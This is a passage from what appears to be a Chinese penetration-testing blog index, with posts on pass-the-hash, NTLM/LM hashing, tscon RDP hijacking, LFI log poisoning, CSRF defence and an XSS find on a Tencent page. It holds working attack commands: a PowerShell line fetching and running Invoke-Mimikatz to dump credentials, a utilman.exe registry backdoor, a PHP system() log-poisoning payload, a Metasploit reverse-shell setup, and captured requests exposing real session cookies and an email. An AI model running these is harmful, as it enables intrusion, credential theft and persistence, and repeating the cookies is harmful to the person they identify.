-<li><p>Net-NTLM Hash:NTLM v1主要加密算法是DES,NTLM v2主要算法是HMAC-MD5。</p>
-</li>
-</ul>
-<h1 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h1><p>   ​    在内网渗透中，我们经常会需要抓取管理员的密码、NTLM Hash，通过收集这些信息有助于我们扩大战果，尤其是在域环境下。</p>
-<ul>
-<li><p>什么是哈希传递</p>
-<p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p>
-</li>
-<li><p>哈希传递的作用?</p>
-<p>解决了我们渗透中获取不到的明文密码、破解不了NTLM Hash而又想扩大战果的问题。</p>
-</li>
-</ul>
-<ul>
-<li><p>Pass The Hash - 必要条件</p>
-<ul>
-<li>哈希传递需要被认证的主机能够访问到服务器</li>
-<li>哈希传递需要被传递认证的用户名</li>
-<li>哈希传递需要被传/Users/ios/Desktop/Kerberos域认证.md递认证的用户NTLM Hash</li>
-</ul>
-</li>
-</ul>
-<p>要完成一个NTLM 认证，第一步需要客户端将自己要参与认证的用户名发送至服务器端，等待Server给出的challenge…..<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c45b807db5aa630d3b5bc43" alt=""></p>
-<p>Pass The Hash能够完成一个不需要输入密码的NTLM协议认证流程，所以不算是一个漏洞，算是一个技巧。</p>
-<p>Pass The Hash的工具：</p>
-<ul>
-<li>Smbmap</li>
-<li>CrackMapExec</li>
-<li>Smbexec</li>
-<li>Metasploit</li>
-</ul>
-<p>使用CrackMapExec实现Hash传递：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/cache<span class="comment"># cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami</span></span><br><span class="line">SMB 192.168.3.5 445 LIYINGZHEA30B</span><br><span class="line">[*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B)</span><br><span class="line">(domain:PAYLOADS) (signing:False) (SMBv1:True)</span><br><span class="line">SMB 192.168.3.5 445 LIYINGZHEA30B</span><br><span class="line">[+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9</span><br><span class="line">(Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed <span class="built_in">command</span></span><br></pre></td></tr></table></figure>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/01/19/ 浅析Windows本地认证 /">浅析Windows本地认证</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-01-19</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <h2 id="0x00-本地认证"><a href="#0x00-本地认证" class="headerlink" title=" 0x00 本地认证 "></a> 0x00 本地认证 </h2><p>本地操作系统密码存储：%SystemRoot%\system32\config\sam</p>
-<p>当我们登录系统的时候，系统会自动读取SAM文件中的密码与我们输入的密码进行比对，如果相同，证明认证成功。</p>
-<p>SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为数据库。</p>
-<p>为了保证存储的不是明文，从而采用了Hash，但是密码Hash也需要特定的生成算法以及表现形式。</p>
-<h2 id="NTLM-Hash与NTLM"><a href="#NTLM-Hash与NTLM" class="headerlink" title="NTLM Hash与NTLM"></a>NTLM Hash与NTLM</h2><p>​        在windows中，密码Hahs目前称为NTLM Hash ，其中NTLM全程是：”NT LAN Manager”</p>
-<p>​    这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p>
-<p>​    也就是说，NTLM与NTLM Hash相互对应。</p>
-<p>​    在本地认证过程中，其实就是将用户输入的密码切换为NTLM Hash与SAM中的NTLM Hash 进行比较。</p>
-<h2 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title=" NTLM Hash的产生 "></a> NTLM Hash的产生 </h2><p>​    假设我的密码是admin,那么操作系统会将admin转换成十六进制，经过Unicode转换，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt;hex(16进制编码) =61646d696e</span><br><span class="line">61646d696e -&gt; Unicode = 610064006d0069006e00</span><br><span class="line">610064006d0069006e00 -&gt; MD4 =20b14e3cf107a49fbbb0fdf4b63907ee</span><br></pre></td></tr></table></figure>
-<p>本地认证流程：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winlogon.exe -&gt; 接受用户输入 -&gt; lsass.exe -&gt; 认证</span><br></pre></td></tr></table></figure>
-<p>​    首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接受输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密称NTLM Hash， 对SAM数据库比较认证。</p>
-<ul>
-<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登陆程序，用于管理用户登录和退出。</li>
-<li>LSASS用于微软Windows系统的安全机制。它用于本地安全和登录策略。</li>
-</ul>
-<h2 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h2><p>在NTLM协议问世之前，它对 前身 就是LM (LAN Manager)协议。</p>
-<p>LM与NTLM协议的认证机制相同，但是加密算法不同。</p>
-<p>1.用户的密码被限制为最多14个字符。<br>2.用户的密码转换为大写。<br>3.系统中用户的密码编码使用了OEM内码页<br>4.密码不足14字节将会用0来补全。<br>5.固定长度的密码被分成两个7byte部分。每部分转换成比特流，在分7bit为一组末尾加0，组成新的编码<br>6.上步骤得到的8byte二组，分别作为DES key为“KGS!@#$%”进行加密。<br>7.将二组DES加密后的编码拼接，得到最终LM HASH值。</p>
-<p>目前大多的Windows都采用LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：</p>
-<p>bit (比特流)</p>
-<ul>
-<li>将所有小写字母转换称大写字母  &gt; 123ABC //未达到7个字符 ，将密码转换为16进制，分两组，填充为14个字符，空余为使用0x00字符填补&gt; 31323341424300000000000000，将密码分割为两组7个字节的块。</li>
-</ul>
-<p>31323341424300 00000000000000 // 16进制<br>• 将每组转化为比特流，不足56Bit则在左边加0</p>
-<p>31323341424300 -&gt;(转换为二进制)<br>110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000<br>• 将比特流按照7比特一组，分出8组，末尾加0</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0011 000</span><br><span class="line">1 0011 00</span><br><span class="line">10 0011 0</span><br><span class="line">011 0011</span><br><span class="line">1001 001</span><br><span class="line">1 1001 00</span><br><span class="line">11 0100 0</span><br><span class="line">000 0000</span><br></pre></td></tr></table></figure>
-<p>将每组比特流转换为16进制作为被加密的值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0011 0000 -&gt; 3 0</span><br><span class="line">1001 1000 -&gt; 9 8</span><br><span class="line">1000 1100 -&gt; 8 C</span><br><span class="line">0110 0110 -&gt; 6 6</span><br><span class="line">1001 0010 -&gt; 9 2</span><br><span class="line">1100 1000 -&gt; C 8</span><br><span class="line">1101 0000 -&gt; D 0</span><br><span class="line">0000 0000 -&gt; 0 0</span><br></pre></td></tr></table></figure>
-<p> 从上往下得到31323339393400对应的8字节编码：30988C6692C8D000<br>由于后者都为0，结果可想而知，那就都是0;</p>
-<p>作为DES加密key分别对“KGS!@#$%”（换算成十六进制：4B47532140232425）字符，进行DES加密，如下：</p>
-<p>将二组值拼接，最终得到LM HASH值为：</p>
-<p> FAE8BB9ECB799902AAD3B435B51404EE </p>
-<pre><code>在上面的产生过程中，脆弱点就在于DES的Key（KGS!@#$%）是固定的，也就是说，有了Key就能够解出原文。
-</code></pre><p>并且根据LM Hash特征，也能够判断用户的密码是否是大于等于7位。</p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>与LM Hash算法相比，明文口令大小写敏感，无法根据NTLM Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串”KGS!@#$%”。MD4是真正的单向哈希函数，穷举作为数据源出现的明文，难度较大。</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/01/17/---/">利用tscon未授权登录远程桌面</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-01-17</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p>​    1、 Windows系统下，tscon可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>​<br>参考三好学生师傅的文章，故经过实际情况，发现还是有很多出路，故小结下自己的小思路。</p>
-<p>对于开启远程桌面服务的Windows系统，当有多个用户登录该系统时，会产生多个会话，如下图：<br>测试系统： Server 2008 R2<br>用户Administrator为本地登录  </p>
-<p>用户college通过远程桌面服务(RDP)想要切换至用户administraror,可通过右键-Connect进行连接，接着输入密码即可。</p>
-<p>如下图：</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c404179db5aa630d38302fb" alt=""></p>
-<p>tscon是命令行下使用的工具，可实现相同的功能。</p>
-<p>首先获取用户对应的sessionid,执行如下命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041a050f8dd61e0410f24" alt=""></p>
-<p>用户administrator对应的sessionsid为2 </p>
-<p>通过tscon切换到用户管理员的桌面，命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tscon 3 /PASSWORD：XXXXX</span><br></pre></td></tr></table></figure>
-<p>通过三好学生师傅的方法、获取System权限，就能绕过输入密码的过程，直接切换。</p>
-<p>参考 ：</p>
-<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">渗透技巧——从Admin权限切换到System权限</a></p>
-<p>但在默些环境中，常常被系统策略阻断了，常常不得以实现。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041b89b521a6695ab0076" alt=""></p>
-<p>通常一般拿到webshell后、进行mimikatz一波输出、dump出用户组的ntlm，如果exe被杀软拦截了或组策略限制了， 那依然还是可以使用Powershell进行操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure>
-<p>由于菜刀处于非交换模式，默些情况导致无法运行突破UAC的运行的下，可用辅助工具管理器后门(放大镜后门原理相同，进程为sethc.exe)配合tscon绕过系统登录界面</p>
-<p>调用辅助工具管理器的快捷键: Win+U<br>通过注册表劫持实现后门，修改注册表的命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
-<p>在登录界面启动辅助工具管理器，弹出cmd.exe，权限为system，如下图：</p>
-<p>即可成功从本地用户组跳入域主机内。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041ce50f8dd61e04113e5" alt=""></p>
-<p>当然，也是可以通过创建服务的方法进行劫持。</p>
-<p><img src="https://mochazz.github.io/img/pentest1/p14.png" alt=""></p>
-<p><strong>补充：</strong></p>
-<p>在登录界面状态下，降权方法受限，SelectMyParent和Invoke-TokenManipulation.ps1均报错</p>
-<p>使用incognito能够成功降权，但是操作受限如下图：</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c4041e42711cd053c709956" alt=""></p>
-<h2 id="防御建议："><a href="#防御建议：" class="headerlink" title="防御建议："></a>防御建议：</h2><p>建议用户使用注销用户的方式断开远程桌面，注销后，无法通过tscon获得桌面会话</p>
-<p>监控系统用户的登录日志，攻击者需要先远程登录系统后才能做进一步利用：未授权切换桌面会话</p>
-<p>对于Windows系统，需要注意攻击者如果获得了系统的访问权限，能够利用放大镜和辅助工具管理器后门实现未授权登录</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/11/20/在Linux下文件包含漏洞的另类拿SHELL方法 /">在Linux下文件包含漏洞的另类拿SHELL方法</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2018-11-20</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p>在实战中还是比较鸡肋的，不过用来维持权限也是很棒的。</p>
-<pre><code>攻击者：Kali Linux
-目标：Ubuntu
-</code></pre><p>创建一个PHP文件，允许用户通过文件参数包含文件。因此，使用文件参数，我们可以执行一个包含恶意代码的文件,使未经授权的访问是目标PC。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bf447eadb5aa647e44e3070" alt=""></p>
-<p>由于我们已经在/ var / www / html中添加了一个包含include函数的php文件，允许通过它读取另一个文件的内容，并且可能导致LFI攻击。让我们通过构造URL来读取密码文件</p>
-<h2 id="本地主机-lfi-php-文件-etc-passwd文件"><a href="#本地主机-lfi-php-文件-etc-passwd文件" class="headerlink" title="本地主机/lfi.php?文件=/etc/passwd文件"></a>本地主机/lfi.php?文件=/etc/passwd文件</h2><p><img src="https://www.yunzhijia.com/microblog/filesvr/5bf448509b521a5a853731e5" alt=""></p>
-<p>在kali Linux中打开终端并 通过SSH服务连接目标<br>    在靶机上键入以下命令查看其日志：<br>    tail -f /var/log/auth.log<br>    从下面的图片你可以检查auth.log文件的生成日志的详细信息。</p>
-<p>   <img src="https://www.yunzhijia.com/microblog/filesvr/5bf44873db5aa647e44e30ae" alt=""><br>    现在我将尝试在浏览器上通过lfi.php打开auth.log日志文件，因此授予对auth.log的读写权限，这也就是所说的鸡肋处。</p>
-<p><code>chmod 775 auth.log</code></p>
-<p>由于auth.log文件会在我们尝试连接到Web服务器时为每次成功都生成日志，并失败登录尝试。现在利用这个功能，我会发送恶意PHP代码 作为假用户，它会自动添加到auth.log文件作为新的日志。</p>
-<p>发送恶意PHP代码 作为假用户，它会自动添加到auth.log文件作为新的日志。</p>
-<p><code>ssh  &#39; &lt;？php system（$ _ GET [&#39;c&#39;]）; ？&gt;&#39;@ 172.16.20.131</code></p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5bf44891db5aa647e44e30bc" alt=""></p>
-<h2 id="本地主机-lfi-php-文件-var-log-auth-log-amp-c-ifconfig"><a href="#本地主机-lfi-php-文件-var-log-auth-log-amp-c-ifconfig" class="headerlink" title=" 本地主机/lfi.php?文件=/var/log/auth.log&amp;c=ifconfig"></a> 本地主机/lfi.php?文件=/var/log/auth.log&amp;c=ifconfig</h2><p><img src="https://www.yunzhijia.com/microblog/filesvr/5bf448fb50f8dd54d461c343" alt=""><br>如果您在任何Web应用程序中发现此类漏洞，则可以使用metasploit平台来利用Web服务器。</p>
-<figure class="highlight plain"><figcaption><span>exploit/multi/script/web_delivery</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf exploit (web_delivery)&gt;set target 1</span><br><span class="line">msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; set lhost 119.29.205.214</span><br><span class="line">msf exploit (web_delivery)&gt;set srvport  8089</span><br><span class="line">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>
-<p>将上面 复制的恶意代码粘贴到 URL中，如图所示，并将 其 作为命令执行。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bf928ba9b521a5a857e5341" alt=""><br>当上面的代码得到执行时，您将获得目标Web服务器的meterpreter会话1。<br><img src="https://www.yunzhijia.com/microblog/filesvr/5bf448cf50f8dd54d461c322" alt=""></p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/11/14/如何有效防御CSRF/">如何有效防御CSRF</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2018-11-14</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p>防御方案：</p>
-<p>Referer</p>
-<p>Token </p>
-<ul>
-<li>前后端分离</li>
-<li>前后端未分离</li>
-</ul>
-<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer "></a>Referer </h2><p>一般情况下，CSRF攻击不能伪造Referer，所以限制Referer来源可以用来限制CSRF漏洞。并且Referer的修复成本相比token来讲，确实低了很多，但是，当存在一个XSS漏洞，通过XSS+CSRF组合攻击，Referer限制就能被绕过。</p>
-<h2 id="token"><a href="#token" class="headerlink" title="token "></a>token </h2><p>0x01 前后端未分离：</p>
-<ol>
-<li><p>后端随机产生一个token，把这个token保存在SESSION状态中，同时，后端把这个token交给前端页面；</p>
-</li>
-<li><p>下次前端需要发起请求(比如发帖)的时候把这个token加入请求数据或头信息中，一起转给后端；</p>
-</li>
-<li><p>后端校验前端请求带过来的token和session里的token是否一致；</p>
-</li>
-</ol>
-<h2 id="0x02-前后端分离："><a href="#0x02-前后端分离：" class="headerlink" title="0x02 前后端分离："></a>0x02 前后端分离：</h2><p>(可以借助Cookie把这个升级下，通过Cookie进行浏览器和服务端的交互。</p>
-<ol>
-<li><p>后端随机产生一个token</p>
-</li>
-<li><p>后端将这个token设置为cookie，返回给前端</p>
-</li>
-<li><p>前端需要发起请求的时候，从cookie中获取token，把这个token加入请求数据或者头信息中，一起传给后端，由于前端要获取cookie里的token，所以该token必须设置为非httponly</p>
-</li>
-<li><p>后端校验$_cookie[‘token’]= $_POST[‘token’]</p>
-</li>
-</ol>
-<p>在这种防御方案下，攻击者构造一个CSRF页面，由于不知道被攻击者的cookie中的token字段的值，导致无法构造$_POST[‘token’]参数，所以，攻击失败。</p>
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul>
-<li><p>CSRF的token存在cookie的方式，如果存在xss，必定会被绕过，因为前端要获取cookie里的token，该字段必须设置为非httponly，否则获取不到。</p>
-</li>
-<li><p>用Referer限制防御CSRF，存在XSS也会被绕过。</p>
-</li>
-<li><p>通过$SESSION的token方式，CSRF防御不会被XSS等漏洞绕过，因为XSS等漏洞不能操作SESSION。</p>
-</li>
-<li><p>CSRF的防御手段(除了SESSION)目前在有XSS组合利用情况下都可以被绕过。(XSS和CSRF同域的情况下)。</p>
-</li>
-</ul>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2018/11/01/从SELF-XSS到存储型XSS-附绕过token分析过程 /">从SELF-XSS到存储型XSS/附绕过token分析过程</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2018-11-01</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p>真正领会了渗透测试中的骚思路后才能挖掘出更多有意思的漏洞，这次的漏洞挖掘是我最近挖的一个觉得比较有意思的漏洞，分析在这里，这个世界从来不缺少创作者。</p>
-<p>事情发生在2018年11月01日晚上，地点：北京 天气有点冷。<br>沉浸在对自己的前途一片黑暗之中，无法自拔。于是，又当起了XSSer。</p>
-<p>0x01   已修复</p>
-<p><a href="https://om.qq.com/article/preview?articleId=20181101A1AC67" target="_blank" rel="noopener">https://om.qq.com/article/preview?articleId=20181101A1AC67</a><br>在文章正文处输入fuzz，发现输出在script标签下、script标签下从来不缺绕过的方法，然后输入payload，点击预览：</p>
-<p>参考：<a href="https://e7t65s.github.io/c1y2m3.github.io/2018/10/18/%E6%B5%85%E8%B0%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E7%BB%95%E8%BF%87%E5%92%8C%E9%98%B2%E5%BE%A1/" target="_blank" rel="noopener">浅谈跨站脚本绕过和防御 </a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​1&apos;&#125;;eval(String.fromCharCode(97,108,101,114,116,40,49,50,51,41));var pass=&#123;&apos;id&apos;: &apos;1</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-5b7870dc0c92469e0599f7a2a6415c62.png" alt=""><br>发现无法闭合，被过滤的明明白白了，可惜峰回路转，于是就有了下面的故事<br>抓取了预览包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=1 HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 628</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: pgv_pvi=20205568; ptui_loginuin=49738195; pt2gguin=o0049738195; RK=IE7gjzyEER; ptcz=e26757456ce43cd621229cf0277060fe320cadbdb9fe960be031819bb0ff2445; pgv_pvid=2078291729; o_cookie=49738195; pac_uid=1_49738195; ts_uid=3270008848; tvfe_boss_uuid=b1944c47bc974c16; TSID=a6sjhfrnokjepmuvn1el6qn6h6; wxky=1; omtoken=8d3093de7a; omtoken_expire=1541058741; fname=%E5%8D%81%E9%87%8C%E6%9C%9B%E6%B5%B7; fimgurl=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_ls%2F0%2F5927755268_200200%2F0; userid=13550050; rmod=1; pgv_info=ssid=s7825261201; alertclicked=%7C%7C; 9e67236d07bdc7152e6e2b42b7f00f43=e6d7af23146a99ae80577cf63db0ae6875312071a%253A4%253A%257Bi%253A0%253Bs%253A8%253A%252213550050%2522%253Bi%253A1%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bi%253A2%253Bi%253A43200%253Bi%253A3%253Ba%253A15%253A%257Bs%253A6%253A%2522status%2522%253Bi%253A2%253Bs%253A5%253A%2522email%2522%253Bs%253A25%253A%2522xiaoxuan339449639%2540163.com%2522%253Bs%253A9%253A%2522logintype%2522%253Bi%253A1%253Bs%253A3%253A%2522uin%2522%253BN%253Bs%253A5%253A%2522phone%2522%253BN%253Bs%253A4%253A%2522wxid%2522%253BN%253Bs%253A6%253A%2522imgurl%2522%253Bs%253A55%253A%2522http%253A%252F%252Finews.gtimg.com%252Fnewsapp_ls%252F0%252F5927755268_200200%252F0%2522%253Bs%253A4%253A%2522name%2522%253Bs%253A12%253A%2522%25E5%258D%2581%25E9%2587%258C%25E6%259C%259B%25E6%25B5%25B7%2522%253Bs%253A10%253A%2522isVerified%2522%253Bb%253A1%253Bs%253A10%253A%2522isRejected%2522%253Bb%253A0%253Bs%253A9%253A%2522agreeAcpt%2522%253Bb%253A1%253Bs%253A6%253A%2522pwdChg%2522%253Bb%253A0%253Bs%253A9%253A%2522avatarChg%2522%253Bb%253A0%253Bs%253A2%253A%2522lk%2522%253Bs%253A24%253A%2522vuexdDhyUgp6cIaVLUo0Dw00%2522%253Bs%253A2%253A%2522id%2522%253Bs%253A8%253A%252213550050%2522%253B%257D%257D</span><br><span class="line"></span><br><span class="line">title=c1y2m3&amp;title2=&amp;tag=&amp;video=&amp;cover_type=1&amp;imgurl_ext=%5B%7B%7D%5D&amp;category_id=&amp;content=%3Cp%3E1%26%2339%3B%7D%3Beval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C49%2C50%2C51%2C41))%3Bvar+pass%3D%7B%26%2339%3Bid%26%2339%3B%3A+%26%2339%3B1%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3C%2Fp%3E%3Cp+class%3D%22empty%22%3E%3Cbr%2F%3E%3C%2Fp%3E&amp;orignal=0&amp;user_original=0&amp;music=&amp;activity=&amp;apply_olympic_flag=0&amp;apply_push_flag=0&amp;apply_reward_flag=0&amp;reward_flag=0&amp;survey_id=&amp;survey_name=&amp;articleId=20181101A10YRL&amp;summary=&amp;conclusion=&amp;type=0&amp;commodity=&amp;pushInfo=&amp;is_commercial=0&amp;media=13550050</span><br></pre></td></tr></table></figure></p>
-<p>发现在提交数据后，前端已经做了实体编码了。<br>在拦截之后修改content的值 ，然后Forward ~<br>返回包如下：<br><img src="http://i.3001.net/uploads/Up_imgs/20181101-da9853a424ce04ed7cde3823ca7ae7c6.png!small" alt=""><br><img src="http://i.3001.net/uploads/Up_imgs/20181101-fa790e1cceee92203177f6beeff436e4.png!small" alt=""></p>
-<p>成功弹窗~ So，推测<br>代码逻辑：客户端 -&gt; 前端进行编码 -&gt; 服务器接受参数时(未过滤)<br>于是 通过 客户端 -&gt; 前端进行编码 -&gt; 通过中间人修改参数 -&gt; 发送 -&gt; 服务器接受 -&gt; 渲染到页面触发XSS</p>
-<p>但是心想这只是个预览界面，无法交互道，别人是没办法访问的，相当于SELF-XSS，利用率不高，那我就发布上线吧，利用同样流程 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kuaibao.qq.com/s/20181101A10YRL00</span><br></pre></td></tr></table></figure>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-2d0d3ab0cea43c0f49244238fc5c1c51.png!small" alt=""></p>
-<p>心想mmp，发布上线的后端在接受数据的时候，直接进行替换了，导致没办法利用…. 这个问题让我纠结了很久，睡觉睡觉。</p>
-<p>咦，不是预览处还有个二维码吗？二维码里面一定有个可以外部访问的链接，然后用手机打开</p>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-69dc95ec8c7e5b25103d3f32b215fecf.png!small" alt=""></p>
-<p>获得以下链接：<br><code>https://om.qq.com/open/preview?articleId=20181101A10A4T&amp;token=59354A0D09336BE940DB6A9A2EF32D38</code></p>
-<p>….  竟然还带token，并且token带有时间值，失效了就生成新的token，腾讯的同学真是良心用苦了。</p>
-<p><img src="http://i.3001.net/uploads/Up_imgs/20181101-d6fd5c4cab52b722e2130fba345f0367.png!small" alt=""></p>
-<p>但是就因为如此，存在了一些缺陷， 只要是在token没有失效的前提下， 无论怎么(重新)预览发布出去token还是原先的token值，所以可以通过条件竞争来维持会话的固定性，使得链接可以一直被访问。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /article/saveAndPreview?relogin=§1§ HTTP/1.1</span><br><span class="line">Host: om.qq.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://om.qq.com/article/articlePublish</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 467</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: TSID=flncmls3hsc30ihqn15363qn16; _qpsvr_localtk=0.5534494737035368; pgv_pvi=3438402560; pgv_si=s2581188608; 